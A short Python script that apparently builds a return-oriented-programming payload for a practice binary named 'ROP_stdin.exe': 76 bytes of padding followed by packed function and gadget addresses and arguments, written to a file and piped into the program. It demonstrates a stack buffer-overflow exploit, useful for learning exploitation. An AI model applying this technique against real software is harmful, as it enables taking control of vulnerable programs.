import os
import struct

mul_addr = struct.pack('L', 0x004013EC)
exit = struct.pack('L', 0x004010E5)
arg_1 = struct.pack('L', 0x00000014)
arg_2 = struct.pack('L', 0x00000016)
pop_pop_ret = struct.pack('L', 0x42434445 )

input = "A" * 76
input += mul_addr
input += pop_pop_ret
input += arg_1
input += arg_2
input += exit

f = open("out", "w")
f.write(input)
f.close()

os.system("ROP_stdin.exe 1 < out")